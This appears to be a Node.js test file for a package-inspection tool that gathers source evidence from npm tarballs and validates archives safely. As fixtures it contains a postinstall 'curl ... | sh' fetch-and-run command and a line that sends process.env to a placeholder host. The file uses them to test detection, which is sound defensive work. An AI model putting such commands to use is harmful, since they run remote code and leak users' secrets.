import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { createHash } from 'node:crypto';
import { gzipSync, gunzipSync } from 'node:zlib';
import { collectSourceBundle } from './source-bundle.mjs';
import { readSourceArchive } from './archive-reader.mjs';

function tarball(entries) {
  const chunks = [];
  for (const entry of entries) {
    const data = Buffer.from(entry.text ?? ''), header = Buffer.alloc(512);
    header.write(entry.path, 0, 100); header.write('0000644\0', 100, 8);
    header.write(data.length.toString(8).padStart(11, '0') + '\0', 124, 12);
    header.fill(32, 148, 156); header[156] = (entry.type ?? '0').charCodeAt(0);
    if (entry.link) header.write(entry.link, 157, 100);
    header.write('ustar\0', 257, 6);
    const sum = header.reduce((a, b) => a + b, 0);
    header.write(sum.toString(8).padStart(6, '0') + '\0 ', 148, 8);
    chunks.push(header, data, Buffer.alloc((512 - data.length % 512) % 512));
  }
  return gzipSync(Buffer.concat([...chunks, Buffer.alloc(1024)]));
}
function pax(key, value) {
  const body = ` ${key}=${value}\n`; let length = Buffer.byteLength(body) + 1;
  while (length !== Buffer.byteLength(body) + String(length).length) length = Buffer.byteLength(body) + String(length).length;
  return `${length}${body}`;
}
const content = bundle => bundle.files.flatMap(file => file.excerpts.map(excerpt => excerpt.text)).join('\n');

describe('source-only evidence bundles', () => {
  it('collects entrypoint source without any rule finding or suspicious keyword', () => {
    const bundle = collectSourceBundle(tarball([{ path: 'package/index.js', text: 'export const sum=(a,b)=>a+b;' }]), { name: 'hidden-name', version: '9.9.9', main: 'index.js', label: 'malicious', dist: {} });
    assert.equal(bundle.coverage.archiveInspection.status, 'complete');
    assert.equal(bundle.coverage.sourceCoverage, 'complete');
    assert.equal(bundle.files[0].path, 'package/index.js');
    assert.ok(content(bundle).includes('sum'));
    assert.ok(!JSON.stringify(bundle).includes('hidden-name'));
    assert.ok(!JSON.stringify(bundle).includes('9.9.9'));
    assert.ok(!Object.hasOwn(bundle, 'findings'));
    assert.ok(!Object.hasOwn(bundle.manifestContext, 'label'));
  });
  it('finds source reachable from an innocuous entrypoint and lifecycle file', () => {
    const bundle = collectSourceBundle(tarball([
      { path: 'package/index.js', text: 'module.exports=require("./lib/helper");' },
      { path: 'package/lib/helper.js', text: 'export const value=42;' },
      { path: 'package/scripts/setup.js', text: 'const installed=true;' },
    ]), { main: 'index.js', scripts: { postinstall: 'node ./scripts/setup.js' } });
    assert.deepEqual(bundle.selection.declaredEntries, ['package/index.js', 'package/scripts/setup.js']);
    assert.ok(bundle.files.find(f => f.path.endsWith('helper.js')).selectionReasons.includes('relative-source-reference'));
  });
  it('provides original manifest spans for inline lifecycle commands', () => {
    const original = '{\n  "name":"fixture",\n  "scripts":{"postinstall":"curl https://example.invalid/script | sh"}\n}\n';
    const bundle = collectSourceBundle(tarball([{ path: 'package/package.json', text: original }, { path: 'package/data.json', text: '{"ordinary":true}' }]), { scripts: { postinstall: 'curl https://example.invalid/script | sh' }, dist: { registryOnly: 'not original evidence' } });
    const file = bundle.files.find(file => file.path === 'package/package.json');
    assert.ok(file.selectionReasons.includes('archive-manifest'));
    assert.ok(file.excerpts.some(excerpt => excerpt.text.includes('postinstall')));
    for (const excerpt of file.excerpts) assert.equal(original.slice(excerpt.startOffset, excerpt.endOffset), excerpt.text);
    assert.ok(!bundle.files.some(file => file.path === 'package/data.json'));
    assert.ok(!content(bundle).includes('not original evidence'));
  });
  it('includes suspicious tail and signal windows in a long single-line bundle', () => {
    const source = 'const data="' + 'a'.repeat(12000) + '"; fetch("https://example.invalid", {body:process.env});' + ' '.repeat(1000);
    const bundle = collectSourceBundle(tarball([{ path: 'package/bundle.js', text: source }]), { main: 'bundle.js' }, { maxSourceChars: 1600, maxCharsPerFile: 1600 });
    assert.equal(bundle.coverage.archiveInspection.status, 'complete');
    assert.equal(bundle.coverage.sourceCoverage, 'partial');
    assert.ok(content(bundle).includes('process.env'));
    assert.ok(bundle.coverage.shownChars <= 1600);
    assert.ok(bundle.files[0].excerpts.some(excerpt => excerpt.endOffset === source.length));
    for (const excerpt of bundle.files[0].excerpts) {
      assert.equal(source.slice(excerpt.startOffset, excerpt.endOffset), excerpt.text);
      assert.equal(excerpt.startLine, 1); assert.equal(excerpt.endLine, 1);
    }
  });
  it('reports correct offsets and mixed newline line positions', () => {
    const source = 'one\r\ntwo\nthree\rfour\u2028five\u2029six';
    const bundle = collectSourceBundle(tarball([{ path: 'package/index.js', text: source }]), {});
    assert.equal(bundle.files[0].totalLines, 6);
    assert.equal(bundle.files[0].excerpts[0].endLine, 6);
    assert.equal(bundle.files[0].excerpts[0].endOffset, source.length);
  });
  it('makes deterministic selections independent of archive member order', () => {
    const entries = Array.from({ length: 20 }, (_, i) => ({ path: `package/file-${i}.js`, text: 'export const x=' + i + ';' }));
    assert.deepEqual(collectSourceBundle(tarball(entries), {}), collectSourceBundle(tarball([...entries].reverse()), {}));
  });
  it('prioritizes declared code before spending the decoded text budget', () => {
    const bundle = collectSourceBundle(tarball([{ path: 'package/a.js', text: ' '.repeat(100) }, { path: 'package/z.js', text: 'start();' }]), { main: 'z.js' }, { maxTextBytes: 20 });
    assert.equal(bundle.files[0].path, 'package/z.js');
    assert.equal(bundle.coverage.sourceCoverage, 'partial');
  });
  it('reports file and total byte budgets without claiming source completion', () => {
    const bundle = collectSourceBundle(tarball([{ path: 'package/a.js', text: 'x'.repeat(100) }, { path: 'package/b.js', text: 'ok();' }]), {}, { maxFileBytes: 64, maxTextBytes: 64 });
    assert.equal(bundle.coverage.archiveInspection.status, 'complete');
    assert.equal(bundle.coverage.sourceCoverage, 'partial');
    assert.equal(bundle.coverage.candidateFiles, 2);
    assert.equal(bundle.coverage.omittedCount, 1);
  });
  it('accepts an exact file-byte boundary and marks one-byte excess as partial', () => {
    const exact = collectSourceBundle(tarball([{ path: 'package/index.js', text: ' '.repeat(64) }]), {}, { maxFileBytes: 64 });
    assert.equal(exact.coverage.sourceCoverage, 'complete');
    assert.equal(exact.coverage.decodedBytes, 64);
    const excess = collectSourceBundle(tarball([{ path: 'package/index.js', text: ' '.repeat(65) }]), {}, { maxFileBytes: 64 });
    assert.equal(excess.coverage.archiveInspection.status, 'complete');
    assert.equal(excess.coverage.sourceCoverage, 'partial');
    assert.equal(excess.coverage.decodedBytes, 0);
    assert.equal(excess.coverage.omitted[0].reason, 'Source file byte limit');
  });
  it('caps omission metadata and bounds total shown text across many files', () => {
    const entries = Array.from({ length: 100 }, (_, i) => ({ path: `package/a-${i}.js`, text: 'const x=1;'.repeat(100) }));
    const bundle = collectSourceBundle(tarball(entries), {}, { maxSourceChars: 300, maxFiles: 2 });
    assert.ok(bundle.coverage.shownChars <= 300);
    assert.equal(bundle.coverage.omittedCount, 98);
    assert.equal(bundle.coverage.omitted.length, 64);
    assert.equal(bundle.coverage.omissionListTruncated, true);
  });
  it('makes native-only content explicitly outside source coverage', () => {
    const bundle = collectSourceBundle(tarball([{ path: 'package/addon.node', text: 'native fixture' }]), {});
    assert.equal(bundle.coverage.sourceCoverage, 'partial');
    assert.equal(bundle.files.length, 0);
  });
  it('verifies supplied SRI but does not leak its availability into the evidence', () => {
    const archive = tarball([{ path: 'package/index.js', text: 'const x=1;' }]);
    const integrity = 'sha512-' + createHash('sha512').update(archive).digest('base64');
    assert.deepEqual(collectSourceBundle(archive, { dist: { integrity } }), collectSourceBundle(archive, {}));
    assert.equal(collectSourceBundle(archive, { dist: { integrity: 'sha512-AAAA' } }).coverage.archiveInspection.status, 'failed');
  });
  it('preserves fixed safety caps even if callers ask to raise them', () => {
    const archive = tarball([{ path: 'package/large.js', text: ' '.repeat(4 * 1024 * 1024 + 1) }]);
    assert.equal(collectSourceBundle(archive, {}, { maxFileBytes: 16 * 1024 * 1024 }).coverage.sourceCoverage, 'partial');
  });
});

describe('bounded archive validation', () => {
  it('supports PAX and GNU long filenames without extracting anything', () => {
    const path = 'package/' + 'folder/'.repeat(20) + 'index.js';
    for (const extended of [{ path: 'pax', type: 'x', text: pax('path', path) }, { path: 'long', type: 'L', text: path + '\0' }]) {
      const result = readSourceArchive(tarball([extended, { path: 'short.js', text: 'ok();' }]));
      assert.equal(result.status, 'complete'); assert.equal(result.entries[0].path, path);
    }
  });
  it('fails on unsafe paths, links, duplicates and malformed PAX sizes', () => {
    for (const entries of [
      [{ path: '../escape.js' }], [{ path: '/absolute.js' }], [{ path: 'C:/drive.js' }],
      [{ path: 'package/link', type: '2', link: '../../escape' }],
      [{ path: 'package/a.js' }, { path: 'package/a.js' }],
      [{ path: 'pax', type: 'x', text: pax('size', '99') }, { path: 'package/a.js', text: 'x' }],
      [{ path: 'pax', type: 'x', text: pax('path', '../escape') }, { path: 'package/a.js' }],
    ]) assert.equal(readSourceArchive(tarball(entries)).status, 'failed');
  });
  it('fails checksum and trailing data validation', () => {
    const original = gunzipSync(tarball([{ path: 'package/index.js', text: 'ok();' }]));
    const badHeader = Buffer.from(original); badHeader[0] ^= 1;
    const badTail = Buffer.from(original); badTail[badTail.length - 1] = 1;
    assert.equal(readSourceArchive(gzipSync(badHeader)).status, 'failed');
    assert.equal(readSourceArchive(gzipSync(badTail)).status, 'failed');
    assert.equal(collectSourceBundle(gzipSync(badTail), {}).files.length, 0);
    assert.equal(readSourceArchive(null).status, 'failed');
  });
  it('bounds decompression bombs, compressed bytes and entry counts', () => {
    const archive = tarball([{ path: 'package/index.js', text: ' '.repeat(100000) }]);
    assert.equal(readSourceArchive(archive, { maxUnpackedBytes: 1024 }).status, 'partial');
    assert.equal(readSourceArchive(archive, { maxArchiveBytes: 1 }).status, 'partial');
    assert.equal(readSourceArchive(archive, { maxEntries: 0 }).status, 'partial');
  });
});
